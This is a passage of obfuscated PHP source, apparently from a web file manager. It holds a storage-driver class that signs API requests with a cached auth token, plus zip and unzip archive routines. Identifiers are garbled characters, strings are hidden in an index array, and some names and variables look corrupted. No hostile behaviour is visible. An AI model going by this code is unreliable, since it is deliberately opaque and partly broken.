$this->_config[$¦àşÉôš[1503]]; $èßœëü· = strlen($ëÀË—áø); if (substr($Î“‡Äı±, 0, $èßœëü·) == $ëÀË—áø) { return $Î“‡Äı±; } return $ëÀË—áø . ltrim($Î“‡Äı±, $¦àşÉôš[8]); } protected function pathApiDecode($Ö€ìŸ¥‚) { $ö´Í‘Ğ =& $_SERVER[±Ö‰ô½¯]; $—íùêòÛ = $this->_config[$ö´Í‘Ğ[1503]]; $¥úøí = strlen($—íùêòÛ); if (substr($Ö€ìŸ¥‚, 0, $¥úøí) !== $—íùêòÛ) { return $Ö€ìŸ¥‚; } return $this->_config[$ö´Í‘Ğ[1303]] . ltrim(substr($Ö€ìŸ¥‚, $¥úøí), $ö´Í‘Ğ[8]); } private function pathInfoParse(&$ûêùÏŒı) { $ÙŠö†„ç =& $_SERVER[±Ö‰ô½¯]; $†‚Ô–³à = $this->_config; $À¬ëâªª = $†‚Ô–³à[$ÙŠö†„ç[573]]; if (!$ûêùÏŒı || !is_array($ûêùÏŒı)) { return $ûêùÏŒı; } static $¢·£Á¥¥ = array(); $ûÑÄƒÇû = $¢·£Á¥¥[$À¬ëâªª[$ÙŠö†„ç[685]]]; if (!is_array($ûÑÄƒÇû)) { $®¥ĞŸà = LNG($ÙŠö†„ç[1531]); $ù¹ÎØ² = $†‚Ô–³à[$ÙŠö†„ç[577]][$ÙŠö†„ç[90]]; $‘Ì˜ƒÒÃ = parse_url($†‚Ô–³à[$ÙŠö†„ç[577]][$ÙŠö†„ç[1532]]); $¦ÂØåº´ = $†‚Ô–³à[$ÙŠö†„ç[577]][$ÙŠö†„ç[1533]]; $ûÑÄƒÇû = array($ÙŠö†„ç[1534] => $ù¹ÎØ²[$ÙŠö†„ç[32]] . $ÙŠö†„ç[1016] . $¦ÂØåº´ . $ÙŠö†„ç[1345] . $‘Ì˜ƒÒÃ[$ÙŠö†„ç[208]] . $ÙŠö†„ç[1018], $ÙŠö†„ç[1535] => $®¥ĞŸà . $ÙŠö†„ç[1082] . $†‚Ô–³à[$ÙŠö†„ç[577]][$ÙŠö†„ç[1532]] . $ÙŠö†„ç[1536] . LNG($ÙŠö†„ç[1537]) . $ÙŠö†„ç[1082] . $¦ÂØåº´, $ÙŠö†„ç[1538] => LNG($ÙŠö†„ç[1539]) . $ÙŠö†„ç[1540] . $†‚Ô–³à[$ÙŠö†„ç[577]][$ÙŠö†„ç[1532]] . $ÙŠö†„ç[287] . LNG($ÙŠö†„ç[1541]) . $ÙŠö†„ç[1540] . $ù¹ÎØ²[$ÙŠö†„ç[599]], $ÙŠö†„ç[1533] => array($ÙŠö†„ç[32] => $¦ÂØåº´, $ÙŠö†„ç[1542] => $ÙŠö†„ç[1543]), $ÙŠö†„ç[1544] => Action($ÙŠö†„ç[1489])->shareTargetMake($À¬ëâªª[$ÙŠö†„ç[1500]])); $¢·£Á¥¥[$À¬ëâªª[$ÙŠö†„ç[685]]] = $ûÑÄƒÇû; } unset($ûêùÏŒı[$ÙŠö†„ç[193]]); unset($ûêùÏŒı[$ÙŠö†„ç[601]]); unset($ûêùÏŒı[$ÙŠö†„ç[190]]); unset($ûêùÏŒı[$ÙŠö†„ç[586]]); $ûêùÏŒı[$ÙŠö†„ç[1545]] = !0; $ûêùÏŒı[$ÙŠö†„ç[234]] = $†‚Ô–³à[$ÙŠö†„ç[1507]]; $ûêùÏŒı[$ÙŠö†„ç[235]] = $†‚Ô–³à[$ÙŠö†„ç[1508]]; $ûêùÏŒı[$ÙŠö†„ç[499]] = $†‚Ô–³à[$ÙŠö†„ç[1505]]; $ûêùÏŒı[$ÙŠö†„ç[1533]] = $ûÑÄƒÇû[$ÙŠö†„ç[1533]]; $ûêùÏŒı[$ÙŠö†„ç[1546]] = $À¬ëâªª[$ÙŠö†„ç[233]]; $ûêùÏŒı[$ÙŠö†„ç[1547]] = $À¬ëâªª[$ÙŠö†„ç[88]]; $ûêùÏŒı[$ÙŠö†„ç[1548]] = $ûÑÄƒÇû[$ÙŠö†„ç[1538]]; $ûêùÏŒı[$ÙŠö†„ç[1544]] = $ûÑÄƒÇû[$ÙŠö†„ç[1544]]; $®Ú²«â = explode($ÙŠö†„ç[8], trim($ûêùÏŒı[$ÙŠö†„ç[599]], $ÙŠö†„ç[8])); $®Ú²«â[0] = $ûÑÄƒÇû[$ÙŠö†„ç[1534]]; $ûêùÏŒı[$ÙŠö†„ç[599]] = implode($ÙŠö†„ç[8], $®Ú²«â); if (count($®Ú²«â) > 1) { unset($ûêùÏŒı[$ÙŠö†„ç[1544]]); } if (count($®Ú²«â) == 1) { if ($ûêùÏŒı[$ÙŠö†„ç[33]] == $ÙŠö†„ç[78]) { $ûêùÏŒı[$ÙŠö†„ç[32]] = $ûÑÄƒÇû[$ÙŠö†„ç[1534]]; } array_set_value($ûêùÏŒı, $ÙŠö†„ç[1549], $ûÑÄƒÇû[$ÙŠö†„ç[1535]]); } $õù²„—Á = array($ÙŠö†„ç[1550], $ÙŠö†„ç[1469], $ÙŠö†„ç[1551], $ÙŠö†„ç[1552]); foreach ($õù²„—Á as $‹Ë€›æ”) { $ÜûıõÈÃ = $this->urlAuto(_get($ûêùÏŒı, $‹Ë€›æ”, $ÙŠö†„ç[12])); if ($ÜûıõÈÃ) { array_set_value($ûêùÏŒı, $‹Ë€›æ”, $ÜûıõÈÃ); } } } private function _info($Èò’Æä, $µ·ñò… = false) { $öÀ¼‘Ùç =& $_SERVER[±Ö‰ô½¯]; $°÷½Æ«— = $this->_config; if (!$°÷½Æ«—) { return !1; } static $ÔÌ¿Ùš = array(); if (isset($ÔÌ¿Ùš[$Èò’Æä]) && is_array($ÔÌ¿Ùš[$Èò’Æä])) { return $ÔÌ¿Ùš[$Èò’Æä]; } if ((!$Èò’Æä || !trim($Èò’Æä, $öÀ¼‘Ùç[8])) && !$µ·ñò…) { $ó’ƒ¡á = $°÷½Æ«—[$öÀ¼‘Ùç[577]][$öÀ¼‘Ùç[90]]; if (!$ó’ƒ¡á) { return !1; } $ó’ƒ¡á[$öÀ¼‘Ùç[599]] = $öÀ¼‘Ùç[12]; $ó’ƒ¡á[$öÀ¼‘Ùç[87]] = $°÷½Æ«—[$öÀ¼‘Ùç[1303]]; $this->pathInfoParse($ó’ƒ¡á); return $ó’ƒ¡á; } $ñÒÃ‰´ = $this->request($öÀ¼‘Ùç[1553], array($Èò’Æä, $µ·ñò…)); $ÔÌ¿Ùš[$Èò’Æä] = $ñÒÃ‰´; return $ñÒÃ‰´; } private function _fileSubstr($Ô«†ƒ, $Şöã¦Ø® = 0, $ğáìĞÜ” = -1) { $ÌÚÒµŒ =& $_SERVER[±Ö‰ô½¯]; $ßÙ¤ûÑÉ = $this->_fileLink($Ô«†ƒ); if (!$ßÙ¤ûÑÉ) { return !1; } $â„ §Ä = !1; if ($ğáìĞÜ” > 0) { $ ŒÒ¢µÆ = $¡Öûë– + $ğáìĞÜ” - 1; $â„ §Ä = array($ÌÚÒµŒ[1554] . $¡Öûë– . $ÌÚÒµŒ[474] . $ ŒÒ¢µÆ); } $œÏæĞá = url_request($ßÙ¤ûÑÉ, $ÌÚÒµŒ[1555], !1, $â„ §Ä); return $œÏæĞá[$ÌÚÒµŒ[847]] ? $œÏæĞá[$ÌÚÒµŒ[1339]] : !1; } private function _download($¾²áú¨, $ñÓÙò¸€) { $Åø³œàç = $this->_fileLink($¾²áú¨); if (!$Åø³œàç) { return !1; } Downloader::start($Åø³œàç, $ñÓÙò¸€); return $ñÓÙò¸€; } private function _fileLink($ì²…ÛÕŒ, $¸Ë¤Ì÷ = '') { $Ú­¼æş =& $_SERVER[±Ö‰ô½¯]; $ƒ»Ê±ú = $this->pathApiEncode($ì²…ÛÕŒ); return $this->requestMakeUrl($Ú­¼æş[1556], array($Ú­¼æş[87] => $ƒ»Ê±ú)) . $¸Ë¤Ì÷; } private function urlAuto($ëÊŸ«½á) { $Âª”Ä£Î =& $_SERVER[±Ö‰ô½¯]; if (!$ëÊŸ«½á) { return $ëÊŸ«½á; } $ÃÏ›î˜Ì = parse_url($ëÊŸ«½á); $˜Òô°Ç“ = $ëÊŸ«½á; if ($this->_config[$Âª”Ä£Î[1506]] && $ÃÏ›î˜Ì[$Âª”Ä£Î[207]] == $Âª”Ä£Î[151] && Input::check($ÃÏ›î˜Ì[$Âª”Ä£Î[1557]], $Âª”Ä£Î[1558])) { $ëÊŸ«½á = $Âª”Ä£Î[219] . substr($ëÊŸ«½á, 7); } $–‚éÕÛ§ = $Âª”Ä£Î[1559] . rawurlencode(rtrim($this->config[$Âª”Ä£Î[1503]], $Âª”Ä£Î[8])); if (strstr($ëÊŸ«½á, $–‚éÕÛ§)) { $ù„ïş† = strstr($ëÊŸ«½á, $Âª”Ä£Î[76]) ? $Âª”Ä£Î[286] : $Âª”Ä£Î[76]; $ëÊŸ«½á = $ëÊŸ«½á . $ù„ïş† . $Âª”Ä£Î[1560] . $this->authToken; } return $ëÊŸ«½á; } private function request($åš³ºÉš, $ìÑ‚‡«ß) { $«©í¯µå =& $_SERVER[±Ö‰ô½¯]; if (!is_array($ìÑ‚‡«ß)) { $ìÑ‚‡«ß = array(); } for ($…€şİş = 0; $…€şİş < 4; $…€şİş++) { if (!isset($ìÑ‚‡«ß[$…€şİş])) { $ìÑ‚‡«ß[$…€şİş] = $«©í¯µå[12]; } } $×“¼à¡Ô = array($«©í¯µå[1553] => array($«©í¯µå[1561] => $«©í¯µå[1553], $«©í¯µå[1562] => $«©í¯µå[1563], $«©í¯µå[1564] => $«©í¯µå[87], $«©í¯µå[1302] => array($«©í¯µå[1565] => array(array($«©í¯µå[87] => $ìÑ‚‡«ß[0])), $«©í¯µå[1566] => $ìÑ‚‡«ß[1] ? $«©í¯µå[91] : $«©í¯µå[12])), $«©í¯µå[1515] => array($«©í¯µå[1561] => $«©í¯µå[1567], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1564] => $«©í¯µå[1568], $«©í¯µå[1302] => array($«©í¯µå[87] => $ìÑ‚‡«ß[0])), $«©í¯µå[1569] => array($«©í¯µå[1561] => $«©í¯µå[1570], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1564] => $«©í¯µå[1571], $«©í¯µå[1302] => array($«©í¯µå[87] => $ìÑ‚‡«ß[0])), $«©í¯µå[1516] => array($«©í¯µå[1561] => $«©í¯µå[1572], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1573] => $«©í¯µå[1574], $«©í¯µå[1302] => array($«©í¯µå[87] => $ìÑ‚‡«ß[0], $«©í¯µå[170] => $ìÑ‚‡«ß[1])), $«©í¯µå[1492] => array($«©í¯µå[1561] => $«©í¯µå[1492], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1573] => $«©í¯µå[592], $«©í¯µå[1302] => array($«©í¯µå[87] => $ìÑ‚‡«ß[0], $«©í¯µå[170] => $ìÑ‚‡«ß[1], $«©í¯µå[1530] => $ìÑ‚‡«ß[2])), $«©í¯µå[1493] => array($«©í¯µå[1561] => $«©í¯µå[1493], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1573] => $«©í¯µå[592], $«©í¯µå[1302] => array($«©í¯µå[87] => $ìÑ‚‡«ß[0], $«©í¯µå[1530] => $ìÑ‚‡«ß[2])), $«©í¯µå[638] => array($«©í¯µå[1561] => $«©í¯µå[1575], $«©í¯µå[1562] => $«©í¯µå[1576], $«©í¯µå[1573] => $«©í¯µå[1577], $«©í¯µå[1302] => array($«©í¯µå[1565] => array(array($«©í¯µå[87] => $ìÑ‚‡«ß[0])), $«©í¯µå[87] => $ìÑ‚‡«ß[1], $«©í¯µå[1530] => $ìÑ‚‡«ß[2])), $«©í¯µå[640] => array($«©í¯µå[1561] => $«©í¯µå[1578], $«©í¯µå[1562] => $«©í¯µå[1576], $«©í¯µå[1573] => $«©í¯µå[1577], $«©í¯µå[1302] => array($«©í¯µå[1565] => array(array($«©í¯µå[87] => $ìÑ‚‡«ß[0])), $«©í¯µå[87] => $ìÑ‚‡«ß[1], $«©í¯µå[1530] => $ìÑ‚‡«ß[2])), $«©í¯µå[1280] => array($«©í¯µå[1561] => $«©í¯µå[1579], $«©í¯µå[1562] => $«©í¯µå[1563], $«©í¯µå[1564] => $«©í¯µå[87], $«©í¯µå[1302] => array($«©í¯µå[1565] => array(array($«©í¯µå[87] => $ìÑ‚‡«ß[0])))), $«©í¯µå[1496] => array($«©í¯µå[1561] => $«©í¯µå[1580], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1573] => $«©í¯µå[592], $«©í¯µå[1302] => array($«©í¯µå[87] => $ìÑ‚‡«ß[0], $«©í¯µå[1581] => $ìÑ‚‡«ß[1])), $«©í¯µå[108] => array($«©í¯µå[1561] => $«©í¯µå[1520], $«©í¯µå[1562] => $«©í¯µå[87], $«©í¯µå[1573] => $«©í¯µå[592], $«©í¯µå[1302] => array($«©í¯µå[87] => get_path_father($ìÑ‚‡«ß[0]), $«©í¯µå[232] => $ìÑ‚‡«ß[1] ? $«©í¯µå[1345] . $ìÑ‚‡«ß[1] : $«©í¯µå[12], $«©í¯µå[32] => get_path_this($ìÑ‚‡«ß[0]), $«©í¯µå[1530] => $ìÑ‚‡«ß[2]))); $–Š¼ÂÃ² = $×“¼à¡Ô[$åš³ºÉš]; if (!$–Š¼ÂÃ²) { return !1; } $€û¹¶şÓ = $–Š¼ÂÃ²[$«©í¯µå[1302]]; $É¾„ŒÂñ = explode($«©í¯µå[50], $–Š¼ÂÃ²[$«©í¯µå[1562]]); foreach ($É¾„ŒÂñ as $åú—ÅªÍ) { $ŸèÌ¾Ö¬ = $this->pathApiEncode(_get($€û¹¶şÓ, $åú—ÅªÍ)); array_set_value($€û¹¶şÓ, $åú—ÅªÍ, $ŸèÌ¾Ö¬); } if ($åš³ºÉš == $«©í¯µå[1496] && trim($–Š¼ÂÃ²[$«©í¯µå[1302]][$«©í¯µå[87]], $«©í¯µå[8]) == trim($this->_config[$«©í¯µå[1303]], $«©í¯µå[8])) { return $–Š¼ÂÃ²[$«©í¯µå[1302]][$«©í¯µå[87]]; } $¿§ä‚”Ë = $this->requestSend($–Š¼ÂÃ²[$«©í¯µå[1561]], $€û¹¶şÓ); if (!$¿§ä‚”Ë) { return !1; } $­ñªêŒ± = $¿§ä‚”Ë[$«©í¯µå[1339]]; if ($–Š¼ÂÃ²[$«©í¯µå[1573]]) { $­ñªêŒ± = _get($¿§ä‚”Ë, $–Š¼ÂÃ²[$«©í¯µå[1573]]); } if (is_string($­ñªêŒ±) && !$–Š¼ÂÃ²[$«©í¯µå[1564]]) { return $this->pathApiDecode($­ñªêŒ±); } if (!is_array($­ñªêŒ±) || !$­ñªêŒ±) { return $­ñªêŒ±; } $ÜŞøÛÉ‡ = explode($«©í¯µå[50], $–Š¼ÂÃ²[$«©í¯µå[1564]]); foreach ($ÜŞøÛÉ‡ as $åú—ÅªÍ) { $Íğ»£œ = explode($«©í¯µå[10], $åú—ÅªÍ); $ªèÅÇ¦  = array_search($«©í¯µå[1582], $Íğ»£œ); if ($ªèÅÇ¦  === !1) { $ŸèÌ¾Ö¬ = $this->pathApiDecode(_get($­ñªêŒ±, $åú—ÅªÍ)); array_set_value($­ñªêŒ±, $åú—ÅªÍ, $ŸèÌ¾Ö¬); if ($åš³ºÉš == $«©í¯µå[1553] && $åú—ÅªÍ == $«©í¯µå[87]) { $this->pathInfoParse($­ñªêŒ±); } if ($åš³ºÉš == $«©í¯µå[1515] && $åú—ÅªÍ == $«©í¯µå[1583]) { $this->pathInfoParse($­ñªêŒ±[$«©í¯µå[1490]]); } if ($åš³ºÉš == $«©í¯µå[1515]) { $­ñªêŒ±[$«©í¯µå[1584]] = array(); } continue; } $ğªŠ¡¤ú = implode($«©í¯µå[10], array_slice($Íğ»£œ, $ªèÅÇ¦  + 1)); $ÁòëªÆ¤ = array(); if ($ªèÅÇ¦  === 0) { $ÁòëªÆ¤ =& $­ñªêŒ±; } if ($ªèÅÇ¦  === 1) { $ÁòëªÆ¤ =& $­ñªêŒ±[$Íğ»£œ[0]]; } if ($ªèÅÇ¦  === 2) { $ÁòëªÆ¤ =& $­ñªêŒ±[$Íğ»£œ[0]][$Íğ»£œ[1]]; } foreach ($ÁòëªÆ¤ as $åú—ÅªÍ => $ÆûşÀ©›) { $ŸèÌ¾Ö¬ = $this->pathApiDecode(_get($ÆûşÀ©›, $ğªŠ¡¤ú)); array_set_value($ÁòëªÆ¤[$åú—ÅªÍ], $ğªŠ¡¤ú, $ŸèÌ¾Ö¬); $this->pathInfoParse($ÁòëªÆ¤[$åú—ÅªÍ]); } unset($ÁòëªÆ¤); } return $­ñªêŒ±; } private function requestMakeUrl($‘Äõèáª, $ƒüĞ¦¨ô = '') { $”¥†øÆÉ =& $_SERVER[±Ö‰ô½¯]; $Ò¿Ôø•Î = $this->_config; if (!$this->authToken) { return !1; } $êòòˆÖŞ = $this->requestQuery($ƒüĞ¦¨ô, !0) . $”¥†øÆÉ[1585] . $this->authToken; $Ğ§Ø·÷í = rtrim($Ò¿Ôø•Î[$”¥†øÆÉ[577]][$”¥†øÆÉ[1532]], $”¥†øÆÉ[8]) . $”¥†øÆÉ[1586] . $‘Äõèáª; return $Ğ§Ø·÷í . $”¥†øÆÉ[1587] . rawurlencode($Ò¿Ôø•Î[$”¥†øÆÉ[577]][$”¥†øÆÉ[1504]]) . $êòòˆÖŞ; } private function requestAuthToken() { $â–­½Öë =& $_SERVER[±Ö‰ô½¯]; $Ä©ÈÁœ = $this->_config; if (!$Ä©ÈÁœ) { return !1; } $ßùÉğÍ = _get($Ä©ÈÁœ, $â–­½Öë[1588]); $·ôÕ¬Ÿ = array_find_by_field($Ä©ÈÁœ[$â–­½Öë[577]][$â–­½Öë[1544]], $â–­½Öë[1589], $ßùÉğÍ); if (!$·ôÕ¬Ÿ) { return !1; } $’ì‚šá = $·ôÕ¬Ÿ[$â–­½Öë[1590]] . $â–­½Öë[1591] . $·ôÕ¬Ÿ[$â–­½Öë[1293]]; $²ƒàø = $â–­½Öë[1592] . $this->pathParse[$â–­½Öë[484]] . $â–­½Öë[474] . $’ì‚šá; $¯øğêå¸ = Cache::get($²ƒàø); if ($¯øğêå¸) { return $¯øğêå¸; } $¯øğêå¸ = Mcrypt::encode($’ì‚šá, $â–­½Öë[1593]); Cache::set($²ƒàø, $¯øğêå¸, 3600 * 24 * 60); return $¯øğêå¸; } private function requestQuery($ãÌ‘æ¬å = '', $ŠÑâÉÉµ = false) { if (!$ãÌ‘æ¬å || !is_array($ãÌ‘æ¬å)) { return $ãÌ‘æ¬å; } foreach ($ãÌ‘æ¬å as $Ô°„ëèÉ => $˜ŞŒôäŠ) { if (is_array($˜ŞŒôäŠ)) { $ãÌ‘æ¬å[$Ô°„ëèÉ] = json_encode($˜ŞŒôäŠ); } } return $ŠÑâÉÉµ ? $_SERVER[±Ö‰ô½¯][286] . http_build_query($ãÌ‘æ¬å) : $ãÌ‘æ¬å; } private function requestSend($¾õ Ôôö, $ş¿†ÀÉ‰) { $Ë›ñ§–¥ =& $_SERVER[±Ö‰ô½¯]; $Ôšà‰âû = $this->requestMakeUrl($¾õ Ôôö); if (!$Ôšà‰âû) { return !1; } $×óô’ = url_request($Ôšà‰âû, $Ë›ñ§–¥[290], $this->requestQuery($ş¿†ÀÉ‰), !1, !1, !0); $ ÓàŒóÕ = $×óô’[$Ë›ñ§–¥[1339]]; if (!is_array($ ÓàŒóÕ) || !$ ÓàŒóÕ || !$ ÓàŒóÕ[$Ë›ñ§–¥[1349]] || intval($ ÓàŒóÕ[$Ë›ñ§–¥[1349]]) > 500) { $ÂÏÛÊØÌ = is_array($ ÓàŒóÕ) ? $ ÓàŒóÕ[$Ë›ñ§–¥[1339]] : $ ÓàŒóÕ . $Ë›ñ§–¥[12]; if (!$×óô’[$Ë›ñ§–¥[847]]) { $ÂÏÛÊØÌ .= $Ë›ñ§–¥[1594] . $×óô’[$Ë›ñ§–¥[1349]] . $Ë›ñ§–¥[177]; } IO::errorTips($ÂÏÛÊØÌ, !1); return !1; } return $ ÓàŒóÕ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¨Î„¯ØÍ) { parent::__construct($¨Î„¯ØÍ); $this->setSignVersion($_SERVER[±Ö‰ô½¯][249]); } } goto a¶¹¿„øÍë; EæÊÈÈšÜ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $º‚©Ü„„; if ($º‚©Ü„„) { return $º‚©Ü„„; } $¨ğçßæµ = IO::init($_SERVER[±Ö‰ô½¯][8]); return $¨ğçßæµ; } private static function iconvSystem($İìÂÀû) { return self::local()->iconvSystem($İìÂÀû); } private static function iconvApp($ËùéíÁ) { return self::local()->iconvApp($ËùéíÁ); } public static function zipFolder($Œ‰ÑÅŞ¸, $³§­šˆö = "\x7a\151\160", $ŒØƒĞõÚ = '', $Â±¥¦‚¼ = REPEAT_RENAME) { $×‘¢Ò¼É =& $_SERVER[±Ö‰ô½¯]; $§ø¾ÇÁŒ = IO::listPath($Œ‰ÑÅŞ¸); if (!$§ø¾ÇÁŒ) { return !1; } $§ø¾ÇÁŒ = array_merge($§ø¾ÇÁŒ[$×‘¢Ò¼É[85]], $§ø¾ÇÁŒ[$×‘¢Ò¼É[86]]); return self::zip($§ø¾ÇÁŒ, $³§­šˆö, $ŒØƒĞõÚ, $Â±¥¦‚¼); } public static function zip($ˆ•ıÑÇˆ, $±»™ö± = "\172\151\x70", $Ë­Ø¹÷ = '', $î…ÒµÖğ = REPEAT_RENAME) { $Œ’€éÈ† =& $_SERVER[±Ö‰ô½¯]; if (is_string($ˆ•ıÑÇˆ) && $ˆ•ıÑÇˆ) { $ˆ•ıÑÇˆ = array(array($Œ’€éÈ†[87] => $ˆ•ıÑÇˆ)); } $èœÖÈôÙ = self::init($ˆ•ıÑÇˆ[0][$Œ’€éÈ†[87]]); $‚ûŸ¶±² = self::info($ˆ•ıÑÇˆ[0][$Œ’€éÈ†[87]]); $şÈ¢ó—ö = $Œ’€éÈ†[12]; $‹áš‰Òª = $Œ’€éÈ†[12]; $ç¨ æ½˜ = $Œ’€éÈ†[12]; if ($Ë­Ø¹÷ && substr($Ë­Ø¹÷, -1, 1) != $Œ’€éÈ†[8]) { $‹áš‰Òª = get_path_father($Ë­Ø¹÷); $ç¨ æ½˜ = get_path_this($Ë­Ø¹÷); } else { $‹áš‰Òª = self::pathFather($‚ûŸ¶±²[$Œ’€éÈ†[87]]); $ç¨ æ½˜ = $‚ûŸ¶±²[$Œ’€éÈ†[32]] . $Œ’€éÈ†[10] . $±»™ö±; if (count($ˆ•ıÑÇˆ) > 1) { $½œ§šèø = IO::info($‹áš‰Òª); $ç¨ æ½˜ = $½œ§šèø[$Œ’€éÈ†[32]] . $Œ’€éÈ†[10] . $±»™ö±; } if ($Ë­Ø¹÷) { $‹áš‰Òª = $Ë­Ø¹÷; } } if ($èœÖÈôÙ->getType() == $Œ’€éÈ†[107]) { $ØÊŠˆÊÀ = self::init($‹áš‰Òª); $´„î²óà = $ØÊŠˆÊÀ->getType() == $Œ’€éÈ†[107] ? $‹áš‰Òª : get_path_father($èœÖÈôÙ->path); $´„î²óà = IO::getPathInner($´„î²óà); $´„î²óà = rtrim($´„î²óà, $Œ’€éÈ†[8]) . $Œ’€éÈ†[8]; mk_dir($´„î²óà); } else { $şÈ¢ó—ö = TEMP_FILES . $Œ’€éÈ†[1318] . time() . rand_string(8) . $Œ’€éÈ†[8]; mk_dir($şÈ¢ó—ö); file_put_contents($şÈ¢ó—ö . $Œ’€éÈ†[1319], $Œ’€éÈ†[12]); $´„î²óà = $şÈ¢ó—ö; } $î´´¢ö« = IO::info($´„î²óà); if (!$î´´¢ö« || !$î´´¢ö«[$Œ’€éÈ†[235]]) { show_json(LNG($Œ’€éÈ†[1320]), !1); } $ ôÌÒÛÄ = self::zipFileList($ˆ•ıÑÇˆ, $şÈ¢ó—ö); foreach ($ ôÌÒÛÄ as $® ÎŸ’Æ => $¿Ø…ôù) { $ ôÌÒÛÄ[$® ÎŸ’Æ] = self::iconvSystem($¿Ø…ôù); } $¯úÅ¾ÓŒ = get_filename_auto($´„î²óà . $ç¨ æ½˜, $Œ’€éÈ†[12], $î…ÒµÖğ); KodArchive::create(self::iconvSystem($¯úÅ¾ÓŒ), $ ôÌÒÛÄ); if (!IO::exist($¯úÅ¾ÓŒ)) { if ($şÈ¢ó—ö) { del_dir($şÈ¢ó—ö); } write_log($Œ’€éÈ†[1321] . $¯úÅ¾ÓŒ, $Œ’€éÈ†[390]); show_json(LNG($Œ’€éÈ†[1322]), !1); } if (!$şÈ¢ó—ö) { return $¯úÅ¾ÓŒ; } $ÜÀ¡å­Ğ = self::move($¯úÅ¾ÓŒ, $‹áš‰Òª, $î…ÒµÖğ); if ($şÈ¢ó—ö) { del_dir($şÈ¢ó—ö); } if (!$¯úÅ¾ÓŒ) { write_log($Œ’€éÈ†[1323] . $¯úÅ¾ÓŒ . $Œ’€éÈ†[1324] . $‹áš‰Òª, $Œ’€éÈ†[390]); show_json(LNG($Œ’€éÈ†[1322]), !1); } return $ÜÀ¡å­Ğ; } public static function unzip($¡˜å×ğ’, $ùì¯‹ÌŒ, $¾Áâ—Â÷ = "\55\61", $Ç†‰¥İ = "\162\145\x70\154\x61\x63\x65") { $µúÂÈîè =& $_SERVER[±Ö‰ô½¯]; $¦€®§Î¸ = parent::info($¡˜å×ğ’); if (!$¦€®§Î¸) { show_json(LNG($µúÂÈîè[1325]), !1); } $œ¨£àğ = IO::infoFullSimple($ùì¯‹ÌŒ); if (!$œ¨£àğ) { $ùì¯‹ÌŒ = IO::mkdir($ùì¯‹ÌŒ); } if (isset($œ¨£àğ[$µúÂÈîè[193]]) && trim($œ¨£àğ[$µúÂÈîè[87]], $µúÂÈîè[8]) != trim($ùì¯‹ÌŒ, $µúÂÈîè[8])) { $çºÑëİÎ = KodIO::make($œ¨£àğ[$µúÂÈîè[192]]); $¾Ì¹¹±Ğ = IO::fileNameAuto($çºÑëİÎ, $œ¨£àğ[$µúÂÈîè[32]], REPEAT_RENAME_FOLDER, !0); $ùì¯‹ÌŒ = IO::mkdir($çºÑëİÎ . $¾Ì¹¹±Ğ); } $¾Áâ—Â÷ = $¾Áâ—Â÷ && $¾Áâ—Â÷ != $µúÂÈîè[1326] ? @json_decode($¾Áâ—Â÷, !0) : -1; $Şµ„ù’Ø = self::unzipPart($¡˜å×ğ’, $¾Áâ—Â÷); if (!$Şµ„ù’Ø || !IO::exist($Şµ„ù’Ø[$µúÂÈîè[232]])) { show_json(LNG($µúÂÈîè[106]), !1); } $†òì¦Çñ = $Şµ„ù’Ø[$µúÂÈîè[1327]][count($Şµ„ù’Ø[$µúÂÈîè[1327]]) - 1]; if ($†òì¦Çñ[$µúÂÈîè[1255]] == -1 || substr($†òì¦Çñ[$µúÂÈîè[32]], -1, 1) == $µúÂÈîè[8]) { $€˜õ¤ìŸ = $Şµ„ù’Ø[$µúÂÈîè[1328]] . rand_string(10) . $µúÂÈîè[8]; mk_dir($€˜õ¤ìŸ); $¶–ô‡ú = count($Şµ„ù’Ø[$µúÂÈîè[1327]]) == 1 ? IO::ext($¡˜å×ğ’) : get_path_ext($Şµ„ù’Ø[$µúÂÈîè[232]]); $„……ú = KodArchive::extract(self::iconvSystem($Şµ„ù’Ø[$µúÂÈîè[232]]), $€˜õ¤ìŸ, $†òì¦Çñ[$µúÂÈîè[1255]], $¾Ì¹¹±Ğ, $¶–ô‡ú); self::unzipErrorCheck($„……ú, array($µúÂÈîè[1329], $¡˜å×ğ’, $¶–ô‡ú, $ùì¯‹ÌŒ, $Şµ„ù’Ø)); Hook::trigger($µúÂÈîè[1330], $€˜õ¤ìŸ); recursion_dir($€˜õ¤ìŸ, $†öÎ¯‘ê, $Ú¾××÷¼, 0); $ìËí˜™ñ = array_merge($†öÎ¯‘ê, $Ú¾××÷¼); $·Á¨Ôú = array(); foreach ($ìËí˜™ñ as $—Òš³É) { $œ²œÒÈ¬ = IO::move(self::iconvApp($—Òš³É), $ùì¯‹ÌŒ, $Ç†‰¥İ); if ($œ²œÒÈ¬) { $·Á¨Ôú[] = $œ²œÒÈ¬; } } del_dir($€˜õ¤ìŸ); } else { $œ²œÒÈ¬ = IO::move($Şµ„ù’Ø[$µúÂÈîè[232]], $ùì¯‹ÌŒ, $Ç†‰¥İ, get_path_this($†òì¦Çñ[$µúÂÈîè[32]])); if ($œ²œÒÈ¬) { $·Á¨Ôú[] = $œ²œÒÈ¬; } } return $·Á¨Ôú ? $·Á¨Ôú : !1; } public static function unzipList($Ò’ÑéËŞ) { $Õ ¤›Ï³ =& $_SERVER[±Ö‰ô½¯]; $şâ¬á„ = isset($Ò’ÑéËŞ[$Õ ¤›Ï³[1331]]) ? $Ò’ÑéËŞ[$Õ ¤›Ï³[1331]] : !1; $•ó²â¿Ø = isset($Ò’ÑéËŞ[$Õ ¤›Ï³[1255]]) ? @json_decode($Ò’ÑéËŞ[$Õ ¤›Ï³[1255]], !0) : -1; $õæ™Ë­ƒ = self::unzipPart($Ò’ÑéËŞ[$Õ ¤›Ï³[87]], $•ó²â¿Ø); if (!$õæ™Ë­ƒ || !IO::exist($õæ™Ë­ƒ[$Õ ¤›Ï³[232]])) { show_json(LNG($Õ ¤›Ï³[106]), !1); } $ŠÎƒƒÊ§ = $õæ™Ë­ƒ[$Õ ¤›Ï³[1327]][count($õæ™Ë­ƒ[$Õ ¤›Ï³[1327]]) - 1]; $ó–şî¼Ø = in_array(IO::ext($õæ™Ë­ƒ[$Õ ¤›Ï³[232]]), array($Õ ¤›Ï³[390], $Õ ¤›Ï³[1332], $Õ ¤›Ï³[1333], $Õ ¤›Ï³[1334], 